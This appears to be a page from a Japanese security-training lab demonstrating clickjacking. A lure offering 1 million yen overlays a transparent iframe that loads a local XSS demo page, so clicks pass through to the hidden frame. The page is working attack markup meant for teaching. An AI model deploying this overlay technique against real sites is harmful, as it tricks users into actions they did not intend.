<?php include '../includes/header.php'; ?>

<style>
  .trap-zone {
    position: relative;
    width: 100%;
    height: 800px;
    background-color: #fffdec;
    /* 豪華そうな背景色 */
  }

  /* 前面：キラキラした詐欺画面 */
  .fake-ui {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 10;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    pointer-events: none;
    /* 背後にクリックを貫通させる */
    text-align: center;
  }

  .fake-button {
    position: absolute;
    padding: 8px 16px;
    font-size: 14px;
    font-weight: bold;
    color: white;
    background: linear-gradient(to bottom, #ff4d4d, #b30000);
    /* 豪華なグラデ */
    border: 2px solid #fff;
    border-radius: 4px;
    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);

    /* 位置 */
    top: 172px;
    left: 86%;
    transform: translateX(-50%);
    z-index: 10;
  }

  .promo-text {
    background: white;
    padding: 30px;
    border: 5px double #ffd700;
    /* 金色の縁取り */
    border-radius: 15px;
    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
  }

  h1 {
    color: #d32f2f;
    font-size: 3rem;
    margin-bottom: 10px;
  }

  .amount {
    color: #fbc02d;
    font-size: 4rem;
    font-weight: bold;
    text-shadow: 2px 2px #333;
  }
</style>

<div class="trap-zone">
  <div class="fake-ui">
    <div class="promo-text">
      <h1>🎊 クリックジャギング攻撃 🎊</h1>
      <p style="font-size: 1.2rem;">ユーザーにボタンを押させます</p>
      <p style="font-size: 0.9rem; color: #666;">
        ボタンをクリック後、XSS体験ページへ行ってください。
        爆破予告されているでしょう。
      </p>
    </div>

    <button class="fake-button">100万円を受け取る</button>
  </div>

  <iframe
    src="http://localhost:8080/xss/xss.php?message=🚨クリックジャッキング成功（完全ステルス）"
    class="target-iframe"
    style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 5; opacity: 0; border: none;">
  </iframe>
</div>

<?php include '../includes/footer.php'; ?>